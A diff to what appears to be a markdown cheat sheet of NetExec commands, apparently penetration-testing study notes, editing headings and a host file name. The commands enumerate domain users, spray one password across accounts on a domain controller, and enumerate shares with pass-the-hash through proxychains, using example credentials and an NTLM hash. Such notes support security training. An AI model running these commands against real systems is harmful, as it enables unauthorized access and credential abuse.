@@ -10,7 +10,7 @@ description: Various Net Exec commands for every scenario
 nxc smb <DC_IP> -u stephanie -p 'LegmanTeamBenzoin!!' --users | awk '$6 ~ /^[0-9]{4}-/ {print $5}' > users.txt
 ```
 
-#### Password Spray&#x20;
+#### Spray one password to different Users on the DC&#x20;
 
 ```shellscript
 nxc smb -u users.txt -p 'Nexus123!' -d corp.com <DC_IP>
@@ -22,10 +22,10 @@ nxc smb -u users.txt -p 'Nexus123!' -d corp.com <DC_IP>
 nxc smb 192.168.242.0/24 -u stephanie -p 'LegmanTeamBenzoin!!' --shares
 ```
 
-#### Share Enumeration (Using PtH) - check acess to all shares
+#### Share Enumeration (Using PtH) - check access to all shares
 
 ```shellscript
-proxychains4 nxc smb internal-hosts.txt -H fdf36048c1cf88f5630381c5e38feb8e -u wario -d medtech.com --shares
+proxychains4 nxc smb domain-hosts.txt -H fdf36048c1cf88f5630381c5e38feb8e -u wario -d medtech.com --shares
 ```
 
 #### Check for RDP Access Across a Subnet (domain creds)
